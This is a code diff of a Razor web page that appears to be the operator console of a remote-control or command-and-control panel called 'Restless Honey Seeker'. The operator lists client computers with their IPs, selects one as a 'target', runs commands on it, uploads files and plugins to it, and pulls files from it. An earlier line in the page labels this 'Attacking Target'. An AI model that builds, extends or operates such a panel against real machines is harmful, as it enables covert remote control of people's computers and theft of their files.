@@ -3,43 +3,44 @@
 }
 @Styles.Render("~/Content/jquery.console.blink.css")
 @Styles.Render("~/Content/jquery.console.custom.css")
-@*<div class="row">
-    <div class="col-md-12">
-        <div id="containerDiv">...</div>
-    </div>
-</div>*@
+@Styles.Render("~/Content/main.css")
 <div class="row">
-        <div class="col-md-12">
-            <div class="form-group">
-                @*<label for="computer">Upload</label>*@
-                <form role="form" class="form-inline">
-                    @*<select id="uploadType" class="form-control">
-                        <option value="@Library.ECommand.UploadFile">File</option>
-                        <option value="@Library.ECommand.UploadPlugin">Plugin</option>
-                    </select>*@
-                    <input id="files" type="file" />
-                </form>
-            </div>
-        </div>
+    <div class="col-md-12">
+        <form role="form" class="form-inline">
+            <input id="files" type="file" />
+        </form>
     </div>
+</div>
 <div class="row">
     <div class="col-md-12">
         <div class="console"></div>
     </div>
 </div>
+<div class="row">
+    <div class="col-md-12">
+        <span class="pull-left">Status: </span><span class="pull-left" id="status">&nbsp;</span>
+    </div>
+</div>
 <script type="text/javascript" src="~/Content/jquery.console.js"></script>
 <script type="text/javascript">
-    var controller = null;
+    var controller = null,
+        currentTarget = null,
+        returnResult = [],
+        computers = [],
+        files = [],
+        serverCommands = [
+        { 'name': 'help', 'desc': '' },
+        { 'name': 'cmd', 'desc': 'List of client commands' },
+        { 'name': 'clear', 'desc': 'Clear console' },
+        { 'name': 'target', 'desc': 'List client computers' },
+        { 'name': 'target {number}', 'desc': 'Set target (e.g. target 0)' },
+        { 'name': 'target remove', 'desc': 'Remove current target' },
+        { 'name': 'ls', 'desc': 'List files / results for current target' },
+        { 'name': 'get {number}', 'desc': 'Download a file from the server (e.g. get 0)' },
+        { 'name': 'rm {number}', 'desc': 'Remove a file from the server (e.g. get 0)' }
+        ];
 
     $(function () {
-
-        $('input[type="file"]').change(function () {
-            //alert("uploading");
-            commands['upload']("file", function (result) {
-                //alert("OK");
-            });
-        });
-
         var console = $('.console');
         controller = console.console({
             promptLabel: '> ',
@@ -62,7 +63,12 @@
             promptHistory: true,
             welcomeMessage: "Restless Honey Seeker [Version 2016.2.4]\r\nType 'help' for a list of commands"
         });
-        //controller.promptText('5 * 4');
+        //controller.promptText('');
+        $('input[type="file"]').change(function () {
+            commands['upload']("file", function (result) {
+                //alert("done uploading!");
+            });
+        });
     });
 
     function executeCommand(input, onSuccess) {
@@ -79,34 +85,22 @@
         }
     }
 
-    var computers = [],
-        files = [],
-        currentTarget = null;
-    var serverCommands = [
-        { 'name': 'help', 'desc': '' },
-        { 'name': 'cmd', 'desc': 'List of client commands' },
-        { 'name': 'list', 'desc': 'List of client computers' },
-        { 'name': 'clear', 'desc': 'Clear console input' },
-        { 'name': 'target', 'desc': '' }
-    ];
-
-    var returnResult = [];
-
     function getResult() {
         var result = returnResult.slice(0);
         returnResult = [];
         return result;
     }
 
-    function addLine(text, hasMargin) {
+    function addLine(text, hasMargin, _className) {
         text += hasMargin ? "\t" : "";
-        returnResult.push({ msg: text, className: "jquery-console-message-value" });
+        returnResult.push({ msg: text, className: "jquery-console-message-value" + (_className ? " " + _className : "") });
     }
 
     var commands = {
         upload: function (parameters, onSuccess) {
             var files = $("#files").get(0).files;
-            if (currentTarget) {
+            console.log(files);
+            if (currentTarget && currentTarget['IsOnline']) {
                 if (files && files.length > 0) {
                     var fileName = files[0]['name'];
                     addLine("Uploading file '" + fileName + "'...");
@@ -164,8 +158,8 @@
         },
         rm: function (parameters, onSuccess) {
             var file = getSelectedFile(parameters);
-            if(currentTarget && file) {
-                $.post('/Home/DeleteFile', { 'computerHash' : currentTarget['Hash'], 'filename' : file }, function (result) {
+            if (currentTarget && file) {
+                $.post('/Home/DeleteFile', { 'computerHash': currentTarget['Hash'], 'filename': file }, function (result) {
                     console.log("result: " + result);
                 }, "json");
             }
@@ -194,20 +188,24 @@
         },
         run: function (command, parameters, onSuccess) {
             if (currentTarget) {
-
-                addLine("Attacking Target: '" + getComputerDescription(currentTarget) + "'.");
-                addLine("Command: " + command);
-                var pars = "";
-                if (parameters && parameters.length >= 1) {
-                    var parsArray = parameters;
-                    for (var i = 0; i < parsArray.length; i++) {
-                        pars += parsArray[i] + " ";
+                if (currentTarget['IsOnline']) {
+                    addLine("Target: '" + getComputerDescription(currentTarget) + "'.");
+                    addLine("Command: " + command);
+                    var pars = "";
+                    if (parameters && parameters.length >= 1) {
+                        var parsArray = parameters;
+                        for (var i = 0; i < parsArray.length; i++) {
+                            pars += parsArray[i] + " ";
+                        }
+                        pars = pars.trim();
                     }
-                    pars = pars.trim();
+                    addLine("Parameters: " + pars);
+                    editSettings(command, pars, "");
+                    getStatus(onSuccess);
                 }
-                addLine("Parameters: " + pars);
-                editSettings(command, pars, "");
-                getStatus(onSuccess);
+                else {
+                    targetIsOffline(currentTarget);
+                }
             } else {
                 noTarget();
             }
@@ -222,39 +220,59 @@
                 if (parameters.length == 1) {
                     var param1 = ('' + parameters[0]).toLowerCase();
                     if (param1 == 'remove' || param1 == 'clear') {
-                        addLine("Target '" + getComputerDescription(currentTarget) + "' removed.");
+                        addLine("Target '" + getComputerDescription(currentTarget) + "' removed.", true, (currentTarget['IsOnline'] ? "green" : "red"));
                         currentTarget = null;
                     }
                     else {
                         var obj = _.findWhere(computers, { 'id': param1 });
                         if (obj && obj['val']) {
-                            currentTarget = obj['val'];
-                            addLine("New Target: " + getComputerDescription(currentTarget));
+                            if (obj['val']['IsOnline']) {
+                                currentTarget = obj['val'];
+                                addLine("New Target: " + getComputerDescription(currentTarget), true, (currentTarget['IsOnline'] ? "green" : "red"));
+                            }
+                            else {
+                                targetIsOffline(obj['val']);
+                            }
                         }
                     }
+                    onSuccess(getResult());
                 }
             }
             else {
                 if (currentTarget) {
-                    addLine("Current Target: " + getComputerDescription(currentTarget));
+                    $.getJSON('/Home/GetComputers').done(function (data) {
+                        var isOnline = currentTarget['IsOnline'];
+                        loadComputers(data, function (k, v) {
+                            if (v.Hash === currentTarget.Hash) {
+                                currentTarget = v;
+                                isOnline = currentTarget['IsOnline'];
+                                return false;
+                            }
+                        });
+                        addLine("Current Target: " + getComputerDescription(currentTarget), true, (currentTarget['IsOnline'] ? "green" : "red"));
+                        onSuccess(getResult());
+                    });
                 }
                 else {
-                    noTarget();
-                    addLine("");
-                    addLine("Available computers:");
                     $.getJSON('/Home/GetComputers').done(function (data) {
-                        computers = [];
-                        var dataParsed = JSON.parse(data);
-                        $.each(dataParsed, function (k, v) {
-                            computers.push({ id: "" + k, val: v });
-                            addLine(k + ": " + getComputerDescription(v), true);
+                        noTarget();
+                        addLine("Available computers:");
+                        loadComputers(data, function (k, v) {
+                            addLine(k + ": " + getComputerDescription(v), true, (v['IsOnline'] ? "green" : "red"));
                         });
                         onSuccess(getResult());
                     });
                 }
             }
-            onSuccess(getResult());
         }
+    }
+
+    function loadComputers(data, onEach) {
+        computers = [];
+        $.each(JSON.parse(data), function (k, v) {
+            computers.push({ id: "" + k, val: v });
+            onEach(k, v);
+        });
     }
 
     function getSelectedFile(parameters) {
@@ -263,7 +281,11 @@
     }
 
     function noTarget() {
-        addLine("No target selected...\r\n");//Use 'list' to see a list of computers.");
+        addLine("No target selected!\r\nUse 'target' to see a list of client computers.");
+    }
+
+    function targetIsOffline(t) {
+        addLine("Target '" + t['Name'] + "' is OFFLINE!", true, "red");
     }
 
     var psChecker;
@@ -280,14 +302,13 @@
                     if (currentTarget != null) {
                         if (json['ComputerHash'] == null) {
                             clearInterval(psChecker);
-                            //$("#containerDiv").text("done! File: " + json['OutputFile']);
+                            $("#status").text("Done!");
                             if (json['OutputFile']) {
                                 if (json['CanDisplayFileContents']) {
                                     $.ajax({
                                         url: '/Home/GetFile?computerHash=' + currentTarget['Hash'] + '&file=' + json['OutputFile'],
                                         dataType: 'text',
                                         success: function (result) {
-                                            //currentTarget = null;
                                             addLine(result);
                                             onSuccess(getResult());
                                         }
@@ -303,7 +324,7 @@
                             }
                         }
                         else {
-                            //$("#containerDiv").text("working...");
+                            $("#status").text("Working...");
                         }
                     }
                 }
@@ -317,8 +338,7 @@
 
     function getComputerDescription(computer) {
         if (computer) {
-            console.log(computer);
-            return computer['Name'] + ", IP ext.: " + computer['IpExternal'] + ", IP int.: " + computer['IpInternal'] + ", Hash: " + computer['Hash'];
+            return computer['Name'] + ", " + (computer['IsOnline'] ? "ONLINE" : "OFFLINE") + ", IP ext.: " + computer['IpExternal'] + ", IP int.: " + computer['IpInternal'] + ", Hash: " + computer['Hash'];
         }
         return "No computer selected";
     }
@@ -337,9 +357,6 @@
             $.post('/api/RHS/SaveSettings', data, function (result) {
                 //console.log("result: " + result);
             }, "json");
-            //.fail(function (data) {
-            //    console.log('failed');
-            //});
         }
     }
 </script>
